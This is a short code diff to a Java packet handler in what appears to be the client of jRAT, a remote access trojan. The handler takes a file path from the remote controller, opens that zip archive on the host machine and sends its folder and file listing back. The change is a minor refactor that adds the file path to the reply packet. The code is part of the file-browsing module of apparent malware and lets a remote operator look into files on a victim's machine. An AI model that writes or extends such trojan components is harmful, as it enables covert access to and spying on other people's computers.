@@ -2,7 +2,6 @@ package jrat.module.fs.packets;
 
 import jrat.client.Connection;
 import jrat.client.packets.incoming.AbstractIncomingPacket;
-import jrat.client.packets.outgoing.Packet45ArchivePreview;
 
 import java.util.ArrayList;
 import java.util.Enumeration;
@@ -18,8 +17,8 @@ public class Packet63PreviewArchive extends AbstractIncomingPacket {
 		String file = con.readLine();
 		ZipFile zip = new ZipFile(file);
 		Enumeration<? extends ZipEntry> entries = zip.entries();
-		List<ZipEntry> folders = new ArrayList<ZipEntry>();
-		List<ZipEntry> files = new ArrayList<ZipEntry>();
+		List<ZipEntry> folders = new ArrayList<>();
+		List<ZipEntry> files = new ArrayList<>();
 		while (entries.hasMoreElements()) {
 			ZipEntry entry = entries.nextElement();
 			if (entry.isDirectory()) {
@@ -30,12 +29,11 @@ public class Packet63PreviewArchive extends AbstractIncomingPacket {
 		}
 
 		for (ZipEntry entry : folders) {
-			con.addToSendQueue(new Packet45ArchivePreview(true, entry.getName(), 0L));
+			con.addToSendQueue(new Packet45ArchivePreview(file,true, entry.getName(), 0L));
 		}
 
 		for (ZipEntry entry : files) {
-			con.addToSendQueue(new Packet45ArchivePreview(false, entry.getName(), entry.getSize() / 1024L));
-
+			con.addToSendQueue(new Packet45ArchivePreview(file, false, entry.getName(), entry.getSize() / 1024L));
 		}
 
 		zip.close();
